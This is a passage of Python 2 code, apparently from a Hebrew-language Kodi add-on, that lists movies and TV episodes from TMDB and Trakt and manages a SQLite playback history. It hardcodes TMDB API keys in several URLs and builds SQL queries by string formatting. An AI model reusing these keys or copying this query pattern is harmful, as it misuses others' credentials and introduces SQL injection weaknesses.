        xbmcplugin.addSortMethod(int(sys.argv[1]), xbmcplugin.SORT_METHOD_VIDEO_YEAR)

        xbmcplugin.addSortMethod(int(sys.argv[1]), xbmcplugin.SORT_METHOD_VIDEO_RATING)
        xbmcplugin .addDirectoryItems(int(sys.argv[1]),all_d,len(all_d))
def get_file_data():
    file_data=[]
    if os.path.exists(save_file):
            f = open(save_file, 'r')
            file_data = f.readlines()
            f.close()
    return file_data
def utf8_urlencode(params):
    import urllib as u
    # problem: u.urlencode(params.items()) is not unicode-safe. Must encode all params strings as utf8 first.
    # UTF-8 encodes all the keys and values in params dictionary
    for k,v in params.items():
        # TRY urllib.unquote_plus(artist.encode('utf-8')).decode('utf-8')
        if type(v) in (int, long, float):
            params[k] = v
        else:
            try:
                params[k.encode('utf-8')] = v.encode('utf-8')
            except Exception as e:
                logging.warning( '**ERROR utf8_urlencode ERROR** %s' % e )
    
    return u.urlencode(params.items()).decode('utf-8')
def addDir4(name,url,mode,iconimage,fanart,description,video_info={},data=' ',original_title=' ',id=' ',season=' ',episode=' ',tmdbid=' ',eng_name=' ',show_original_year=' ',rating=0,heb_name=' ',isr=0,generes=' ',trailer=' ',dates=' ',watched='no',fav_status='false',collect_all=False,ep_number='',watched_ep='',remain='',hist=''):
        
        name=name.replace("|",' ')
        description=description.replace("|",' ')
        params={}
        params['iconimage']=iconimage
        params['fanart']=fanart
        params['description']=description
        params['url']=url
        
        all_ur=utf8_urlencode(params)
        u=sys.argv[0]+"?mode="+str(mode)+"&name="+(name)+"&heb_name="+(heb_name)+"&dates="+(dates)+"&data="+str(data)+"&original_title="+(original_title)+"&id="+(id)+"&season="+str(season)+"&episode="+str(episode)+"&tmdbid="+str(tmdbid)+"&eng_name="+(eng_name)+"&show_original_year="+(show_original_year)+"&isr="+str(isr)+'&'+all_ur+"&fav_status="+fav_status
        
 
        ok=True
        video_data={}
        video_data['title']=original_title
        if (episode!=' ' and episode!='%20' and episode!=None) :
          video_data['mediatype']='tvshow'
          video_data['TVshowtitle']=original_title
          video_data['Season']=int(str(season).replace('%20','0'))
          video_data['Episode']=int(str(episode).replace('%20','0'))
          tv_show='tv'
        else:
           video_data['mediatype']='movies'
           video_data['TVshowtitle']=''
           video_data['tvshow']=''
           video_data['season']=0
           video_data['episode']=0
           tv_show='movie'
        if  mode==7:
            tv_show='tv'
        video_data['OriginalTitle']=original_title
        if data!=' ':
            video_data['year']=data
        if generes!=' ':
            video_data['genre']=generes
        video_data['rating']=str(rating)
    
        video_data['poster']=fanart
        video_data['plot']=description
        if trailer!=' ':
            video_data['trailer']=trailer
        menu_items=[]

        if watched=='yes':
          video_data['playcount']=1
          video_data['overlay']=7

        str_e1=list(u.encode('utf8'))
        for i in range(0,len(str_e1)):
           str_e1[i]=str(ord(str_e1[i]))
        str_e='$$'.join(str_e1)
        
        change=0
        file_data=cache.get(get_file_data,9999, table='save_file')
        
        # dbcur.execute("SELECT * FROM Lastepisode WHERE original_title = '%s'"%(original_title.replace("'"," ").replace(" ","%20").replace(':','%3a').replace("'",'%27')))

        # match = dbcur.fetchone()
       
        # if match!=None:
        
          # menu_items.append(('[I]הסר ממעקב סדרות[/I]', 'XBMC.RunPlugin(%s)' % ('%s?url=www&original_title=%s&mode=34&name=%s&id=0&season=%s&episode=%s')%(sys.argv[0],original_title,name,season,episode)))
        # dbcur.execute("SELECT * FROM AllData WHERE original_title = '%s'  AND season='%s' AND episode = '%s'"%(original_title.replace("'"," ").replace(" ","%20").replace(':','%3a').replace("'",'%27'),season,episode))
     
        # match = dbcur.fetchone()
        # if match!=None:
        
          # menu_items.append(('[I]הסר סימון נצפה[/I]', 'XBMC.RunPlugin(%s)' % ('%s?url=www&original_title=%s&mode=34&name=%s&id=1&season=%s&episode=%s')%(sys.argv[0],original_title,name,season,episode))) 
        # if str_e+'\n' not in file_data:
           # menu_items.append(('[I]ניקוי מטמון[/I]', 'XBMC.RunPlugin(%s)' % ('%s?url=www&description=%s&mode=16')%(sys.argv[0],str_e)))
          
        # if str_e+'\n' not in file_data:
           # menu_items.append(('[I]הוספה למועדפים שלי[/I]', 'XBMC.RunPlugin(%s)' % ('%s?url=www&description=%s&mode=17')%(sys.argv[0],str_e)))
           
        # else:
           
           # menu_items.append(('[I]הסרה מהמועדפים שלי[/I]', 'XBMC.RunPlugin(%s)' % ('%s?url=www&description=%s&mode=19')%(sys.argv[0],str_e)))
        # if mode==7:
            # menu_items.append(('[I]פתח פרק אחרון ששודר[/I]', 'XBMC.RunPlugin(%s)' % ('%s?url=www&mode=109&id=%s')%(sys.argv[0],id)))
        # if Addon.getSetting("use_trak")=='true' and len(id)>1:
            
            
              
              # menu_items.append(('[I]נצפה בטראק[/I]', 'XBMC.RunPlugin(%s)' % ('%s?url=www&original_title=add&mode=65&name=%s&id=%s&season=%s&episode=%s')%(sys.argv[0],tv_show,id,season,episode))) 
            
              # menu_items.append(('[I]לא נצפה בטראק[/I]', 'XBMC.RunPlugin(%s)' % ('%s?url=www&original_title=remove&mode=65&name=%s&id=%s&season=%s&episode=%s')%(sys.argv[0],tv_show,id,season,episode))) 
        # if mode==4 and hist=='true':
            # menu_items.append(('[I]הסר מאיפה הייתי[/I]', 'XBMC.RunPlugin(%s)' % ('%s?url=%s&mode=159&name=%s&id=%s&season=%s&episode=%s')%(sys.argv[0],tv_show,name.replace("'",'%27').replace(",",'%28'),id,season,episode))) 
            
        # if mode==3 and '%s' not in url:
            # menu_items.append(('[I]מחק מההיסטוריה[/I]', 'XBMC.RunPlugin(%s)' % ('%s?url=%s&mode=152&name=%s')%(sys.argv[0],tv_show,name))) 
        
        # if (mode==4 or mode==7) :
            # menu_items.append(('[I]משהו דומה..[/I]', 'Container.update(%s)' % ('%s?url=%s&mode=26&id=%s')%(sys.argv[0],tv_show,id))) 
        # if (mode==4 or mode==3) and 'movie' in url:
            # menu_items.append(('[I]בדוק תאריך יציאה באיכות[/I]', 'XBMC.RunPlugin(%s)' % ('%s?url=%s&mode=153&name=%s&data=%s&id=%s')%(sys.argv[0],tv_show,original_title,data,id))) 
        menu_items.append(('פרטים', 'Action(Info)'))
        liz=xbmcgui.ListItem(name, iconImage="DefaultFolder.png", thumbnailImage=iconimage)
        liz.addContextMenuItems(menu_items, replaceItems=False)
        if video_info!={}:
            
            video_data=video_info
      
        # if 'fast' not in video_info and id!=' ':
            # info = {'title': id, 'season': season, 'episode': episode}
            # dbcur.execute("SELECT * FROM playback where tmdb='%s' and season='%s' and episode='%s'"%(id,str(season).replace('%20','0').replace(' ','0'),str(episode).replace('%20','0').replace(' ','0')))
            
            # match_playtime = dbcur.fetchone()
            
            # if match_playtime!=None:
       
                # name_r,timdb_r,season_r,episode_r,playtime,totaltime,free=match_playtime
                # res={}
                # #logging.warning((float(totaltime)*0.95))
                
                # if (float(totaltime)*0.95)<=float(playtime):
                    # res['wflag']=True
                # else:
                
                    # res['wflag']=False
                # res['resumetime']=playtime
                # res['totaltime']=totaltime
            # else:
                # res=False
           
            
            # #res = AWSHandler.CheckWS(info)
            # if res:
                # if res['wflag']:
                    # #listitem.setInfo(type = 'video', infoLabels = {'playcount': 1, 'overlay': 5})
                    # video_data['playcount']=1
                    # video_data['overlay']=5
            # if res:
                # if not res['wflag']:
                  # if res['resumetime']!=None:
                    
                    # video_data['playcount']=0
                    # video_data['overlay']=0
                    # liz.setProperty('ResumeTime', res['resumetime'])
                    # liz.setProperty('TotalTime', res['totaltime'])
        # liz.setProperty( "Fanart_Image", fanart )
        if ep_number!='':
            logging.warning('ep_number:'+str(ep_number))
            liz.setProperty('totalepisodes', str(ep_number))
        if watched_ep!='':
           logging.warning('watched_ep:'+ str(watched))
           liz.setProperty('watchedepisodes', str(watched))
                
        
        if remain!='':
            logging.warning('remain:'+ str(remain))
            liz.setProperty('unwatchedepisodes',str(remain))
        art = {}
        art.update({'poster': iconimage})
        liz.setArt(art)
        video_data['title']=video_data['title'].replace("|",' ')
        video_data['plot']=video_data['plot'].replace("|",' ')
  
        
        if (mode==4 ) and Addon.getSetting("new_source_menu")=='true' and  Addon.getSetting("new_window_type2")!='3' and  Addon.getSetting("new_window_type2")!='4':
            liz.setProperty("IsPlayable","true")
            isfolder=False
            video_data['title']=name
        else:
            isfolder=True
        
        if (mode==4 ) and Addon.getSetting("new_source_menu")=='true' and (Addon.getSetting("new_window_type2")=='3' or  Addon.getSetting("new_window_type2")=='4') and  Addon.getSetting("show_sources_in_4")=='false':
            
        
        
            
            isfolder=False
            liz.setProperty("IsPlayable","true")
        liz.setInfo( type="Video", infoLabels=video_data)
        if collect_all:
            return u,liz,isfolder
        
        
        ok=xbmcplugin.addDirectoryItem(handle=int(sys.argv[1]),url=u,listitem=liz,isFolder=isfolder)
        
        return ok,liz
def get_trk_data(url):
        all_trk_data={}
        # time_to_save=int(Addon.getSetting("save_time"))
        xxx=0
        # if Addon.getSetting("dp")=='true':
        dp = xbmcgui.DialogProgress()
        dp.create("טוען סרטים", "אנא המתן", '')
        dp.update(0)
        url_g_m=domain_s+'api.themoviedb.org/3/genre/movie/list?api_key=34142515d9d23817496eeb4ff1d223d0&language=he'
                     
        
        url_g_tv=domain_s+'api.themoviedb.org/3/genre/tv/list?api_key=34142515d9d23817496eeb4ff1d223d0&language=he'
        #html_g_tv=requests.get(url_g_tv).json()
        #html_g_m=requests.get(url_g_m).json()
        #html_g_tv=html_g_tv
        html_g_m=html_g_movie
        start_time = time.time()
        src="tmdb" 
            
        i = (call_trakt('/users/me/watched/movies'))
        
        all_movie_w=[]
        for ids in i:
          all_movie_w.append(str(ids['movie']['ids']['tmdb']))
        '''
        i = (call_trakt('/users/me/watched/shows?extended=full'))
        all_tv_w={}
        for ids in i:
         all_tv_w[str(ids['show']['ids']['tmdb'])]=[]
         for seasons in ids['seasons']:
          for ep in seasons['episodes']:
            all_tv_w[str(ids['show']['ids']['tmdb'])].append(str(seasons['number'])+'x'+str(ep['number']))
        '''
         
        if '$$$$$$$$$$$' in url:
            data_in=url.split('$$$$$$$$$$$')
            user = data_in[0]
            slug = data_in[1]
            selected={'slug':data_in[1],'user':data_in[0]}

            responce=call_trakt("/users/{0}/lists/{1}/items".format(user, slug))
        else:
           responce=call_trakt(url)
        new_name_array=[]

        for items in responce:
          
          if 'show' in items:
             slug = 'tv'
             html_g=html_g_tv
          else:
            slug = 'movies'
            html_g=html_g_m
          if slug=='movies':
            url='http://api.themoviedb.org/3/movie/%s?api_key=%s&language=he&append_to_response=external_ids'%(items['movie']['ids']['tmdb'],'653bb8af90162bd98fc7ee32bcbbfb3d')
          else:
            url='http://api.themoviedb.org/3/tv/%s?api_key=%s&language=he&append_to_response=external_ids'%(items['show']['ids']['tmdb'],'653bb8af90162bd98fc7ee32bcbbfb3d')
          
          html=cache.get(get_movie_data,72,url, table='pages')
          if 'The resource you requested could not be found' not in str(html):
             data=html
             if 'overview' not in data:
                continue
             if 'vote_average' in data:
               rating=data['vote_average']
             else:
              rating=0
             if 'first_air_date' in data :
               if data['first_air_date']==None:
                    year=' '
               else:
                   year=str(data['first_air_date'].split("-")[0])
             else:
                 if 'release_date' in data:
                    if data['release_date']==None:
                        year=' '
                    else:
                        year=str(data['release_date'].split("-")[0])
                 else:
                    year=' '
        
             if data['overview']==None:
               plot=' '
             else:
               plot=data['overview']
             if 'title' not in data:
               new_name=data['name']
             else:
               new_name=data['title']
             f_subs=[]
             if slug=='movies':
               original_name=data['original_title']
               mode=15
               
               id=str(data['id'])
               if Addon.getSetting("check_subs")=='true' or Addon.getSetting("disapear")=='true':
                 f_subs=cache.get(get_subs,9999,'movie',original_name,'0','0',id,year,True, table='pages')
               
               
             else:
               original_name=data['original_name']
               id=str(data['id'])
               mode=16
             if data['poster_path']==None:
              icon=' '
             else:
               icon=data['poster_path']
             if 'backdrop_path' in data:
                 if data['backdrop_path']==None:
                  fan=' '
                 else:
                  fan=data['backdrop_path']
             else:
                fan=html['backdrop_path']
             if plot==None:
               plot=' '
             if 'http' not in fan:
               fan=domain_s+'image.tmdb.org/t/p/original/'+fan
             if 'http' not in icon:
               icon=domain_s+'image.tmdb.org/t/p/original/'+icon
             genres_list= dict([(i['id'], i['name']) for i in html_g['genres'] \
                    if i['name'] is not None])
             try:genere = u' / '.join([genres_list[x['id']] for x in data['genres']])
             except:genere=''

   
            
             trailer = "plugin://plugin.video.telemedia?mode=171&url=www&id=%s" % id
             if new_name not in new_name_array:
              new_name_array.append(new_name)
              if Addon.getSetting("check_subs")=='true' or Addon.getSetting("disapear")=='true':
                  if len(f_subs)>0:
                    color='white'
                  else:
                    color='red'
                    
              else:
                color='white'
              elapsed_time = time.time() - start_time
              # if Addon.getSetting("dp")=='true':
              dp.update(int(((xxx* 100.0)/(len(html))) ), ' אנא המתן '+ time.strftime("%H:%M:%S", time.gmtime(elapsed_time)),'[COLOR'+color+']'+new_name+'[/COLOR]')
              xxx=xxx+1
              watched='no'
              if id in all_movie_w:
                watched='yes'
              '''
              if id in all_tv_w:
                 if season+'x'+episode in all_tv_w[id]:
                  watched='yes'
              '''
              if slug=='movies':
                    fav_search_f=Addon.getSetting("fav_search_f")
                    fav_servers_en=Addon.getSetting("fav_servers_en")
                    fav_servers=Addon.getSetting("fav_servers")
                   
                    google_server= Addon.getSetting("google_server")
                    rapid_server=Addon.getSetting("rapid_server")
                    direct_server=Addon.getSetting("direct_server")
                    heb_server=Addon.getSetting("heb_server")
              else:
                    fav_search_f=Addon.getSetting("fav_search_f_tv")
                    fav_servers_en=Addon.getSetting("fav_servers_en_tv")
                    fav_servers=Addon.getSetting("fav_servers_tv")
                    google_server= Addon.getSetting("google_server_tv")
                    rapid_server=Addon.getSetting("rapid_server_tv")
                    direct_server=Addon.getSetting("direct_server_tv")
                    heb_server=Addon.getSetting("heb_server_tv")
        
   
              if  fav_search_f=='true' and fav_servers_en=='true' and (len(fav_servers)>0 or heb_server=='true' or google_server=='true' or rapid_server=='true' or direct_server=='true'):
                    fav_status='true'
              else:
                    fav_status='false'
              all_d=[]
              
              all_trk_data[id]={}
              all_trk_data[id]['icon']=icon
              all_trk_data[id]['fan']=fan
              all_trk_data[id]['plot']=plot
              all_trk_data[id]['year']=year
              all_trk_data[id]['original_title']=original_name
              all_trk_data[id]['title']=new_name
              all_trk_data[id]['season']='%20'
              all_trk_data[id]['episode']='%20'
              all_trk_data[id]['eng_name']=original_name
              all_trk_data[id]['heb_name']=new_name
              all_trk_data[id]['type']='movie'
              addDir4('[COLOR '+color+']'+new_name+'[/COLOR]',url,mode,icon,fan,plot,data=year,original_title=original_name,id=id,rating=rating,show_original_year=year,isr=isr,generes=genere,trailer=trailer,watched=watched,fav_status=fav_status)
              # all_d.append(aa)
          else:
            
            if slug=='movies':
                responce=call_trakt("movies/{0}".format(items['movie']['ids']['trakt']), params={'extended': 'full'})
            else:
                responce=call_trakt("shows/{0}".format(items['show']['ids']['trakt']), params={'extended': 'full'})
           
           
            addNolink('[COLOR red][I]'+ responce['title']+'[/I][/COLOR]', 'www',999,False)
            
        # if Addon.getSetting("dp")=='true':
        dp.close()
        logging.warning('H8')
        xbmcplugin.addSortMethod(int(sys.argv[1]), xbmcplugin.SORT_METHOD_VIDEO_SORT_TITLE)
        xbmcplugin.addSortMethod(int(sys.argv[1]), xbmcplugin.SORT_METHOD_VIDEO_YEAR)

        xbmcplugin.addSortMethod(int(sys.argv[1]), xbmcplugin.SORT_METHOD_VIDEO_RATING)
        # xbmcplugin .addDirectoryItems(int(sys.argv[1]))
        return all_trk_data

def get_one_trk(color,name,url_o,url,icon,fanart,data_ep,plot,year,original_title,id,season,episode,eng_name,show_original_year,heb_name,isr,dates,xxx,image):
          global all_data_imdb
          import _strptime
          data_ep=''
          dates=' '
          fanart=image
          url=domain_s+'api.themoviedb.org/3/tv/%s/season/%s?api_key=34142515d9d23817496eeb4ff1d223d0&language=he'%(id,season)
         
          html=requests.get(url).json()
          next=''
          ep=0
          f_episode=0
          catch=0
          counter=0
          if 'episodes' in html:
              for items in html['episodes']:
                if 'air_date' in items:
                   try:
                       datea=items['air_date']+'\n'
                       
                       a=(time.strptime(items['air_date'], '%Y-%m-%d'))
                       b=time.strptime(str(time.strftime('%Y-%m-%d')), '%Y-%m-%d')
                      
                   
                       if a>b:
                         if catch==0:
                           f_episode=counter
                           
                           catch=1
                       counter=counter+1
                       
                   except:
                         ep=0
          else:
             ep=0
          episode_fixed=int(episode)-1
          try:
              plot=html['episodes'][int(episode_fixed)]['overview']
          
              ep=len(html['episodes'])
              if (html['episodes'][int(episode_fixed)]['still_path'])==None:
                fanart=image
              else:
                fanart=domain_s+'image.tmdb.org/t/p/original/'+html['episodes'][int(episode_fixed)]['still_path']
              if f_episode==0:
                f_episode=ep
              data_ep='[COLOR aqua]'+'עונה '+season+'-פרק '+episode+ '[/COLOR]\n[COLOR yellow] מתוך ' +str(f_episode)  +' פרקים לעונה זו [/COLOR]\n' 
              if int(episode)>1:
                
                prev_ep=time.strftime( "%d-%m-%Y",(time.strptime(html['episodes'][int(episode_fixed)-1]['air_date'], '%Y-%m-%d'))) 
              else:
                prev_ep=0

          

                      
              if int(episode)<ep:

                if (int(episode)+1)>=f_episode:
                  color_ep='magenta'
                  next_ep='[COLOR %s]'%color_ep+time.strftime( "%d-%m-%Y",(time.strptime(html['episodes'][int(episode_fixed)+1]['air_date'], '%Y-%m-%d'))) +'[/COLOR]'
                else:
                  
                  next_ep=time.strftime( "%d-%m-%Y",(time.strptime(html['episodes'][int(episode_fixed)+1]['air_date'], '%Y-%m-%d'))) 
              else:
                next_ep=0
              dates=((prev_ep,time.strftime( "%d-%m-%Y",(time.strptime(html['episodes'][int(episode_fixed)]['air_date'], '%Y-%m-%d'))) ,next_ep))
              if int(episode)<int(f_episode):
               color='yellow'
              else:
               color='white'
               h2=requests.get('https://api.themoviedb.org/3/tv/%s?api_key=34142515d9d23817496eeb4ff1d223d0&language=en-US'%id).json()
               last_s_to_air=int(h2['last_episode_to_air']['season_number'])
               last_e_to_air=int(h2['last_episode_to_air']['episode_number'])
              
               if int(season)<last_s_to_air:
                 logging.warning('bigger One')
                 color='lightblue'
            
               if h2['status']=='Ended' or h2['status']=='Canceled':
                color='peru'
               
               
               if h2['next_episode_to_air']!=None:
                 
                 if 'air_date' in h2['next_episode_to_air']:
                  
                  a=(time.strptime(h2['next_episode_to_air']['air_date'], '%Y-%m-%d'))
                  next=time.strftime( "%d-%m-%Y",a)
                  
               else:
                  next=''
                 
          except Exception as e:
              logging.warning('Error :'+ heb_name)
              logging.warning('Error :'+ str(e))
              plot=' '
              color='green'
              if f_episode==0:
                f_episode=ep
              data_ep='[COLOR aqua]'+'עונה '+season+'-פרק '+episode+ '[/COLOR]\n[COLOR yellow] מתוך ' +str(f_episode)  +' פרקים לעונה זו [/COLOR]\n' 
              dates=' '
              fanart=image
          try:
            f_name=urllib.unquote_plus(heb_name.encode('utf8'))
     
          except:
            f_name=name
          if (heb_name)=='':
            f_name=name
          if color=='peru':
            add_p='[COLOR peru][B]סדרה זו הסתיימה או בוטלה[/B][/COLOR]'+'\n'
          else:
            add_p=''
          add_n=''
          if color=='white' and url_o=='tv' :
              if next !='':
                add_n='[COLOR tomato][I]פרק הבא ישודר ב ' +next+'[/I][/COLOR]\n'
              else:
                add_n='[COLOR tomato][I]פרק הבא ישודר ב ' +' לא ידוע עדיין '+'[/I][/COLOR]\n'
                next='???'
          
          added_txt=' [COLOR khaki][I]%sx%s[/I][/COLOR] '%(season,episode)
          all_data_imdb.append((color,f_name+' '+added_txt+' '+next,url,icon,fanart,add_p,data_ep,add_n,plot,year,original_title,id,season,episode,eng_name,show_original_year,heb_name,isr,dates,xxx))
          return data_ep,dates,fanart,color,next
def get_html_data(url):
    html=requests.get(url).json()
    return html
def was_i():
    try:
        from sqlite3 import dbapi2 as database
    except:
        from pysqlite2 import dbapi2 as database
    cacheFile=os.path.join(user_dataDir,'database.db')
    dbcon = database.connect(cacheFile)
    dbcur = dbcon.cursor()
    addNolink2('[COLOR red][I][B]נקה היסטוריה[/B][/I][/COLOR]','www',162,False,iconimage='https://keepingitclean.ca/images/social/keep-it-clean-social-sharing.jpg',fanart='https://the-clean-show.us.messefrankfurt.com/content/dam/messefrankfurt-usa/the-clean-show/2021/images/kv/Cleanshow%20websideheader_tropfen_2560x1440px_01.jpg')
    dbcur.execute("SELECT * FROM playback")
    dbcon.commit()
    match = dbcur.fetchall()
    if Addon.getSetting("dp")=='true':
        dp = xbmcgui . DialogProgress ( )
        dp.create('אנא המתן','מבצע איסוף', '','')
        dp.update(0, 'אנא המתן','מבצע איסוף', '' )
    zzz=0
    tmdbKey='653bb8af90162bd98fc7ee32bcbbfb3d'
    all_d=[]
    for name,tmdb,season,episode,playtime,totaltime,free in match:
      
      if float(totaltime)==0:
        continue
      if (int((float(playtime)*100)/float(totaltime)))<95:
        try:
        
            a=int(tmdb)
            
        except:
            if 'tt' in free:
             url=domain_s+'api.themoviedb.org/3/find/%s?api_key=34142515d9d23817496eeb4ff1d223d0&external_source=imdb_id&language=%s'%(free,lang)
             html_im=requests.get(url).json()
             logging.warning(free)
             logging.warning(html_im)
             
             if season=='0':
                 if len(html_im['movie_results'])>0:
                    tmdb=str(html_im['movie_results'][0]['id'])
             else:
                if len(html_im['tv_results'])>0:
                    tmdb=str(html_im['tv_results'][0]['id'])
             try:
        
                a=int(tmdb)
                
             except:
                continue
            else:
                continue
        
        if season!='0' and season!='' and season!='%20':
          url_t='http://api.themoviedb.org/3/tv/%s/season/%s/episode/%s?api_key=653bb8af90162bd98fc7ee32bcbbfb3d&language=%s&append_to_response=external_ids'%(tmdb,season,episode,lang)
          html_t=cache.get(get_html_data,9999,url_t, table='posters')
          if 'status_code' in html_t:
            continue
          if 'still_path' in html_t:
            if html_t['still_path']==None:
                html_t['still_path']=''
          else:
            html_t['still_path']=''
          fan=domain_s+'image.tmdb.org/t/p/original/'+html_t['still_path']
          
          plot= '[COLOR yellow] %s '%str(int((float(playtime)*100)/float(totaltime)))+'%[/COLOR]\n'+html_t['overview']
          url2='http://api.themoviedb.org/3/tv/%s?api_key=%s&language=%s&append_to_response=external_ids'%(tmdb,tmdbKey,lang)
          html=cache.get(get_html_data,9999,url2, table='posters')
          if 'poster_path' in html:
              if html['poster_path']==None:
                html['poster_path']=''
          else:
            html['poster_path']=''
          icon=domain_s+'image.tmdb.org/t/p/original/'+html['poster_path']
          new_name=html['name']+ ' S%sE%s '%(season,episode)
          url='www'
          if 'air_date' in html_t:
           if html_t['air_date']!=None:
             
             year=str(html_t['air_date'].split("-")[0])
           else:
            year='0'
          else:
            year='0'
          if 'first_air_date' in html:
           if html['first_air_date']!=None:
             
             data=str(html['first_air_date'].split("-")[0])
           else:
            data='0'
          else:
            data='0'
          original_name=html['original_name']
          rating=html['vote_average']
          heb_name=html['name']
          isr='0'
          genres_list=[]
          if 'genres' in html:
            for g in html['genres']:
                  genres_list.append(g['name'])
            
            try:genere = u' / '.join(genres_list)
            except:genere=''
          trailer = "plugin://plugin.video.telemedia?mode=171&url=www&id=%s&tv_movie=%s" % (tmdb,'tv')
          
          all_d.append(addDir3(new_name,url,15,icon,fan,plot,data=year,original_title=original_name,id=tmdb,rating=rating,heb_name=heb_name,show_original_year=data,isr=isr,generes=genere,trailer=trailer,season=season,episode=episode,hist='true'))
        
        else:
          url_t='http://api.themoviedb.org/3/movie/%s?api_key=34142515d9d23817496eeb4ff1d223d0&language=%s'%(tmdb,lang)
          
          
          logging.warning(url_t)
          html=cache.get(get_html_data,9999,url_t, table='poster')
          if 'status_code' in html:
            continue
          if 'backdrop_path' in html:
              if html['backdrop_path']==None:
                html['backdrop_path']=''
          else:
            html['backdrop_path']=''
          fan=domain_s+'image.tmdb.org/t/p/original/'+html['backdrop_path']
          
          plot= '[COLOR yellow] %s '%str(int((float(playtime)*100)/float(totaltime)))+'%[/COLOR]\n'+html['overview']
          if 'poster_path' in html:
              if html['poster_path']==None:
                html['poster_path']=''
          else:
            html['poster_path']=''
          icon=domain_s+'image.tmdb.org/t/p/original/'+html['poster_path']
          new_name=html['title']
          url='www'
          if 'release_date' in html:
           if html['release_date']!=None:
             
             year=str(html['release_date'].split("-")[0])
           else:
            year='0'
          else:
            year='0'
          original_title=html['original_title']
          rating=html['vote_average']
          heb_name=html['title']
          isr='0'
          genres_list=[]
          if 'genres' in html:
            for g in html['genres']:
                  genres_list.append(g['name'])
            
            try:genere = u' / '.join(genres_list)
            except:genere=''
          trailer = "plugin://plugin.video.telemedia?mode=171&url=www&id=%s&tv_movie=%s" % (tmdb,'tv')
          all_d.append(addDir3(new_name,url,15,icon,fan,plot,episode=' ',season=' ',data=year,original_title=original_title,id=tmdb,rating=rating,heb_name=heb_name,show_original_year=year,isr=isr,generes=genere,trailer=trailer,hist='true'))
        if Addon.getSetting("dp")=='true':
            dp.update(int(((zzz* 100.0)/(len(match))) ), 'אנא המתן','טוען', new_name )
            zzz+=1
            if dp.iscanceled():
               dp.close()
               break
    if Addon.getSetting("dp")=='true':
        dp.close()
    dbcur.close()
    dbcon.close()
    xbmcplugin .addDirectoryItems(int(sys.argv[1]),all_d,len(all_d))
def remove_was_i(name,id,season,episode):
        try:
            from sqlite3 import dbapi2 as database
        except:
            from pysqlite2 import dbapi2 as database
        cacheFile=os.path.join(user_dataDir,'database.db')
        dbcon = database.connect(cacheFile)
        dbcur = dbcon.cursor()
        dbcur.execute("DELETE  FROM playback   where tmdb='%s' and season='%s' and episode='%s'"%(id,str(season).replace('%20','0').replace(' ','0'),str(episode).replace('%20','0').replace(' ','0')))
        logging.warning(' Remove DATA')
        logging.warning("SELECT * FROM playback where tmdb='%s' and season='%s' and episode='%s'"%(id,str(season).replace('%20','0').replace(' ','0'),str(episode).replace('%20','0').replace(' ','0')))
        dbcon.commit()
        xbmc.executebuiltin((u'Notification(%s,%s)' % ('Mamdo', 'הוסר'.decode('utf8')+name)).encode('utf-8'))
        xbmc.executebuiltin('Container.Refresh')
        dbcur.close()
        dbcon.close()

def clear_was_i():
    ok=xbmcgui.Dialog().yesno(("נקה נקודת זמן ניגון "),('האם אתה בטוח?'))
    if ok:
        try:
            from sqlite3 import dbapi2 as database
        except:
            from pysqlite2 import dbapi2 as database
        cacheFile=os.path.join(user_dataDir,'database.db')
        dbcon = database.connect(cacheFile)
        dbcur = dbcon.cursor()
        dbcur.execute("DELETE FROM playback")
        dbcon.commit()
        dbcur.close()
        dbcon.close()

        xbmc.executebuiltin('Container.Refresh')
def get_Series_trk_data(url_o,match):
        import _strptime
        cacheFile_trk = os.path.join(user_dataDir, 'cache_play_trk.db')
        dbcon_trk2 = database.connect(cacheFile_trk)
        dbcur_trk2  = dbcon_trk2.cursor()
        dbcur_trk2.execute("CREATE TABLE IF NOT EXISTS %s ( ""data_ep TEXT, ""dates TEXT, ""fanart TEXT,""color TEXT,""id TEXT,""season TEXT,""episode TEXT, ""next TEXT,""plot TEXT);" % 'AllData4')
        dbcon_trk2.commit()
        dbcur_trk2.execute("DELETE FROM AllData4")
        logging.warning('Updating sh')
        image=' '
        for item in match:
          next=''
          name,url,icon,image,plot,year,original_title,season,episode,id,eng_name,show_original_year,heb_name,isr,tv_movie=item
          #name,id,season,episode=item
          data_ep=''
          dates=' '
          fanart=image
          url=domain_s+'api.themoviedb.org/3/tv/%s/season/%s?api_key=34142515d9d23817496eeb4ff1d223d0&language=he'%(id,season)
         
          html=requests.get(url).json()
          if 'status_message' in html:
            if html['status_message']!='The resource you requested could not be found.':
                xbmc.sleep(10000)
                html=requests.get(url).json()
            
          ep=0
          f_episode=0
          catch=0
          counter=0
          if 'episodes' in html:
              for items in html['episodes']:
                if 'air_date' in items:
                   try:
                       datea=items['air_date']+'\n'
                       
                       a=(time.strptime(items['air_date'], '%Y-%m-%d'))
                       b=time.strptime(str(time.strftime('%Y-%m-%d')), '%Y-%m-%d')
                      
                   
                       if a>b:
                         if catch==0:
                           f_episode=counter
                           
                           catch=1
                       counter=counter+1
                       
                   except:
                         ep=0
          else:
             ep=0
          episode_fixed=int(episode)-1
          try:
              try:
                plot=html['episodes'][int(episode_fixed)]['overview']
              except:
                logging.warning(name.decode('utf-8'))
                if 'episodes' not in html:
                    logging.warning(html)
                    
                
                logging.warning(episode_fixed)
                
                plot=''
                pass
              
          
              ep=len(html['episodes'])
              if (html['episodes'][int(episode_fixed)]['still_path'])==None:
                fanart=image
              else:
                fanart=domain_s+'image.tmdb.org/t/p/original/'+html['episodes'][int(episode_fixed)]['still_path']
              if f_episode==0:
                f_episode=ep
              data_ep='[COLOR aqua]'+'עונה '+season+'-פרק '+episode+ '[/COLOR]\n[COLOR yellow] מתוך ' +str(f_episode)  +' פרקים לעונה זו [/COLOR]\n' 
              if int(episode)>1:
                
                prev_ep=time.strftime( "%d-%m-%Y",(time.strptime(html['episodes'][int(episode_fixed)-1]['air_date'], '%Y-%m-%d'))) 
              else:
                prev_ep=0

          

              try:
                  if int(episode)<ep:
                    
                    if (int(episode)+1)>=f_episode:
                      color_ep='magenta'
                      next_ep='[COLOR %s]'%color_ep+time.strftime( "%d-%m-%Y",(time.strptime(html['episodes'][int(episode_fixed)+1]['air_date'], '%Y-%m-%d'))) +'[/COLOR]'
                    else:
                      
                      next_ep=time.strftime( "%d-%m-%Y",(time.strptime(html['episodes'][int(episode_fixed)+1]['air_date'], '%Y-%m-%d'))) 
                  else:
                    next_ep=0
              except:
                next_ep=0
              dates=((prev_ep,time.strftime( "%d-%m-%Y",(time.strptime(html['episodes'][int(episode_fixed)]['air_date'], '%Y-%m-%d'))) ,next_ep))
              if int(episode)<int(f_episode):
               color='yellow'
              else:
               color='white'
